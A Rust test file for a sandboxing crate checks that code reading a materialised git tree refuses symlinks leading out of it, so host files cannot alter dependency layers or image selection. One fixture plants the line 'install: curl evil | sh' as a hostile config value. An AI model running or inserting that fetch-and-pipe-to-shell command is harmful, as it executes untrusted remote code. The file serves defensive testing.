//! **Every read of a materialised tree must stay inside it.**
//!
//! # The escape these tests close, one layer along from the one already fixed
//!
//! `materialize` was repaired so that *writing* a tree cannot land outside the
//! target directory: `create_dirs_no_follow` refuses a symlinked parent and
//! `create_new` refuses to write through a link at the final component. The
//! **read** side was not repaired. Every consumer of the materialised tree —
//! `detect_ecosystem`, `dependency_layer`, `dockerfile_reference`,
//! `ReexecConfig::load`, `devcontainer_image`, and the lockfile copy in
//! `docker::ensure_deps_layer` — reached the tree through `std::fs::read`,
//! `Path::is_file` and `std::fs::copy`, **all three of which follow symlinks.**
//!
//! A tree may legally name a symlink. `materialize` correctly *records* the
//! entry as a symlink; the readers *resolved* it, against the host filesystem.
//! So the bytes that decided the dependency layer, the image tag and the build
//! context came from a file **no tree names**.
//!
//! `SandboxError::TreeDivergence` cannot see this. It re-derives the layer from
//! the tree and compares it with the worktree's, and **both sides read the same
//! host file and agree.** The guard is looking at two mirrors.
//!
//! # The property, stated so a test can fail on it
//!
//! §0.3: *"Bind everything to a tree hash."* The environment a check runs in
//! must therefore be **a function of the tree hash and nothing else**. These
//! tests materialise **one tree hash twice**, change a host file the tree names
//! by symlink in between, and assert the two answers are identical. Before the
//! fix they are not: one tree hash, two dependency layers.
//!
//! # Refusal, not resolution-within-the-tree
//!
//! Two repairs were available: resolve the link *inside* the materialised tree
//! (chroot-style), or refuse to traverse it at all. This crate refuses. A
//! resolver is a second path-resolution implementation in the trusted path of a
//! security tool, and it must get `..`, absolute targets, link chains and
//! case-folding right or it reintroduces the escape it was written to close.
//! Refusal has exactly one failure mode — a legitimate re-execution that will
//! not run — and per the standing rule that is the direction a verdict is
//! allowed to move.
//!
//! # Filesystem, not code
//!
//! Nothing here depends on case sensitivity. The symlinks are planted under
//! names that differ from every other entry in more than case, so these tests
//! assert the same property on this machine's case-**insensitive** APFS and on
//! CI's case-**sensitive** ext4. (Two escape tests in this crate previously
//! reported the filesystem rather than the code; that is why this paragraph
//! exists.)

#![cfg(unix)]

use std::os::unix::fs::symlink;
use std::path::Path;
use std::process::Command;

use thruline_reexec::image::{dependency_layer, select};
use thruline_reexec::materialize;

/// The bytes that live on the host and in no tree. If they decide anything,
/// the re-execution is not a re-execution of the tree.
const HOST_SECRET: &str = "HOST-SECRET-IN-NO-TREE";

fn git(dir: &Path, args: &[&str]) -> String {
    let out = Command::new("git")
        .current_dir(dir)
        .args(args)
        .env("GIT_AUTHOR_NAME", "t")
        .env("GIT_AUTHOR_EMAIL", "t@example.invalid")
        .env("GIT_COMMITTER_NAME", "t")
        .env("GIT_COMMITTER_EMAIL", "t@example.invalid")
        .env_remove("GIT_INDEX_FILE")
        .output()
        .unwrap_or_else(|e| panic!("git {args:?}: {e}"));
    assert!(
        out.status.success(),
        "git {args:?}: {}",
        String::from_utf8_lossy(&out.stderr)
    );
    String::from_utf8_lossy(&out.stdout).trim().to_string()
}

/// A repository whose tree names `link` as a symlink to `target`, plus one
/// ordinary file so the tree is not degenerate. Returns the final tree hash.
fn repo_naming_symlink(root: &Path, link: &str, target: &Path) -> String {
    git(root, &["init", "-q", "-b", "main"]);
    let at = root.join(link);
    if let Some(parent) = at.parent() {
        std::fs::create_dir_all(parent).expect("mkdir");
    }
    symlink(target, &at).expect("symlink");
    std::fs::write(root.join("test_x.py"), "def test_x():\n    assert True\n").expect("write");
    git(root, &["add", "-A"]);
    git(root, &["commit", "-qm", "one"]);
    let tree = git(root, &["rev-parse", "HEAD^{tree}"]);
    // The escape only exists if git stored a symlink rather than a copy.
    let entry = git(root, &["ls-tree", "-r", "HEAD"]);
    assert!(
        entry.contains("120000 blob") && entry.contains(link),
        "the fixture did not store {link} as a symlink:\n{entry}"
    );
    tree
}

/// Materialise `tree` into a fresh directory and hand back that directory.
fn materialised(repo: &Path, tree: &str) -> tempfile::TempDir {
    let dir = tempfile::tempdir().expect("tempdir");
    materialize(repo, tree, dir.path()).expect("materialize");
    dir
}

/// A total, comparable rendering of an answer — including a refusal, so that
/// "both refused" counts as agreement and a refusal on only one side does not.
fn describe<T: std::fmt::Debug, E: std::fmt::Display>(r: Result<T, E>) -> String {
    match r {
        Ok(v) => format!("{v:?}"),
        // The path of a temp directory appears in some errors and differs
        // between the two materialisations; the *kind* of refusal is what has
        // to agree.
        Err(e) => {
            let text = format!("{e}");
            format!("refused: {}", text.split(':').next().unwrap_or(&text))
        }
    }
}

// ---------------------------------------------------------------------------
// The dependency layer.
// ---------------------------------------------------------------------------

#[test]
fn one_tree_hash_is_one_dependency_layer_even_when_a_lockfile_is_a_symlink() {
    let host = tempfile::tempdir().expect("host");
    let secret = host.path().join("outside.txt");
    std::fs::write(&secret, "pytest==1.0.0\n").expect("write");

    let repo = tempfile::tempdir().expect("repo");
    let tree = repo_naming_symlink(repo.path(), "requirements.txt", &secret);

    let a = materialised(repo.path(), &tree);
    let first = describe(dependency_layer(a.path()));

    // The tree has not changed. Only a host file it names by symlink has.
    std::fs::write(&secret, format!("{HOST_SECRET}\n")).expect("write");
    let b = materialised(repo.path(), &tree);
    let second = describe(dependency_layer(b.path()));

    assert_eq!(
        first, second,
        "one tree hash produced two dependency layers, so the container the checks run in is \
         not a function of the tree hash the receipt binds them to (§0.3)"
    );
}

#[test]
fn a_lockfile_the_tree_names_as_a_symlink_is_refused_rather_than_followed() {
    let host = tempfile::tempdir().expect("host");
    let secret = host.path().join("outside.txt");
    std::fs::write(&secret, format!("{HOST_SECRET}\n")).expect("write");

    let repo = tempfile::tempdir().expect("repo");
    let tree = repo_naming_symlink(repo.path(), "requirements.txt", &secret);
    let dir = materialised(repo.path(), &tree);

    let err = dependency_layer(dir.path())
        .expect_err("a lockfile that is a symlink out of the tree must refuse, not resolve");
    let text = format!("{err}");
    assert!(
        text.contains("symlink") && text.contains("requirements.txt"),
        "the refusal must name the entry and why: {text}"
    );
}

// ---------------------------------------------------------------------------
// Image selection: every file §7's order consults is read from the tree.
// ---------------------------------------------------------------------------

#[test]
fn one_tree_hash_is_one_image_selection_for_every_file_the_order_consults() {
    // Each of these decides the image, and each was read with a symlink-
    // following call. `.thruline/reexec.yml` also decides the *install command*,
    // which is executed at build time — a host file choosing that is remote
    // code execution dressed as a cache key.
    for (link, innocuous, hostile) in [
        (
            ".thruline/reexec.yml",
            "version: 1\nimage: from-the-tree:1\n",
            &format!("version: 1\nimage: {HOST_SECRET}:1\n") as &str,
        ),
        (
            ".devcontainer/devcontainer.json",
            "{ \"image\": \"from-the-tree:1\" }\n",
            "{ \"image\": \"HOST-SECRET-IN-NO-TREE:1\" }\n",
        ),
        (
            "Dockerfile",
            "FROM scratch\n",
            "FROM scratch\nENV LEAK=HOST-SECRET-IN-NO-TREE\n",
        ),
    ] {
        let host = tempfile::tempdir().expect("host");
        let outside = host.path().join("outside");
        std::fs::write(&outside, innocuous).expect("write");

        let repo = tempfile::tempdir().expect("repo");
        let tree = repo_naming_symlink(repo.path(), link, &outside);

        let a = materialised(repo.path(), &tree);
        let first = describe(select(a.path()));

        std::fs::write(&outside, hostile).expect("write");
        let b = materialised(repo.path(), &tree);
        let second = describe(select(b.path()));

        assert_eq!(
            first, second,
            "one tree hash selected two images because {link} was read through a symlink"
        );
        assert!(
            !first.contains(HOST_SECRET),
            "{link}: the image selection carries bytes from a file no tree names: {first}"
        );
    }
}

#[test]
fn a_symlinked_directory_is_not_walked_through_either() {
    // The subtler half: `materialize` refuses to write an *entry beneath* a
    // symlinked parent, so a tree cannot contain both `.thruline` (a link) and
    // `.thruline/reexec.yml`. It can contain `.thruline` alone — and then
    // `root.join(".thruline/reexec.yml")` walks through the link into the host
    // directory, with no entry beneath it for the write-side guard to catch.
    let host = tempfile::tempdir().expect("host");
    let outside = host.path().join("config");
    std::fs::create_dir(&outside).expect("mkdir");
    std::fs::write(
        outside.join("reexec.yml"),
        "version: 1\nimage: innocuous:1\n",
    )
    .expect("write");

    let repo = tempfile::tempdir().expect("repo");
    let tree = repo_naming_symlink(repo.path(), ".thruline", &outside);

    let a = materialised(repo.path(), &tree);
    let first = describe(select(a.path()));

    std::fs::write(
        outside.join("reexec.yml"),
        format!("version: 1\nimage: {HOST_SECRET}:1\ninstall: curl evil | sh\n"),
    )
    .expect("write");
    let b = materialised(repo.path(), &tree);
    let second = describe(select(b.path()));

    assert_eq!(
        first, second,
        "one tree hash selected two images through a symlinked directory component"
    );
    assert!(
        !first.contains(HOST_SECRET),
        "the selection carries bytes from a host directory no tree names: {first}"
    );
}

// ---------------------------------------------------------------------------
// The mechanism, not just the behaviour.
// ---------------------------------------------------------------------------

/// The source walk, in the same shape as `tests/git_verbs.rs` and for the same
/// reason: the behavioural tests above prove today's readers stay inside the
/// tree, but they cannot see a *new* reader added next month. Every call below
/// follows symlinks silently, and there is no version of "read the materialised
/// tree" that wants one.
///
/// This is also the only witness the lockfile copy in `docker::ensure_deps_layer`
/// has. `dependency_layer` refuses a symlinked lockfile before the copy is ever
/// reached, so restoring `std::fs::copy` there cannot be caught behaviourally —
/// it would sit as a second, unreached symlink-follower waiting for the first
/// refusal to move. That is precisely the shape this program keeps finding, so
/// it is closed at the source level instead.
mod mechanism {
    use std::path::Path;

    /// Line comments stripped: a call named in prose is not a call, and this
    /// file's own comments name every one of them.
    fn code(rel: &str) -> String {
        let path = Path::new(env!("CARGO_MANIFEST_DIR")).join(rel);
        let text = std::fs::read_to_string(&path)
            .unwrap_or_else(|e| panic!("reading {}: {e}", path.display()));
        text.lines()
            .map(|l| match l.find("//") {
                Some(i) => &l[..i],
                None => l,
            })
            .collect::<Vec<_>>()
            .join("\n")
    }

    /// Every std call that resolves a path *through* symlinks.
    const FOLLOWS: &[&str] = &[
        "fs::read(",
        "fs::read_to_string(",
        "fs::copy(",
        "fs::metadata(",
        "File::open(",
        "is_file()",
        "is_dir()",
    ];

    #[test]
    fn no_reader_of_the_materialised_tree_uses_a_call_that_follows_symlinks() {
        for rel in ["src/image.rs", "src/docker.rs"] {
            let src = code(rel);
            for call in FOLLOWS {
                assert!(
                    !src.contains(call),
                    "{rel} calls `{call}`, which resolves through symlinks. A tree may name \
                     a symlink, and reading through it takes the bytes from a file no tree \
                     names — which is how one tree hash produced two dependency layers and \
                     how HOST-SECRET-IN-NO-TREE got into a built image. Read through \
                     `crate::tree_read`, which refuses."
                );
            }
        }
    }

    #[test]
    fn the_replacement_is_actually_used_so_this_walk_is_not_vacuous() {
        // The negative control. A forbidden-call walk over a module that reads
        // the tree some other way would pass while proving nothing.
        for rel in ["src/image.rs", "src/docker.rs"] {
            assert!(
                code(rel).contains("tree_read::"),
                "{rel} no longer reads the tree through `tree_read`. If it changed approach, \
                 re-narrow this guard — an exemption nothing uses is a hole for the next \
                 module."
            );
        }
    }
}
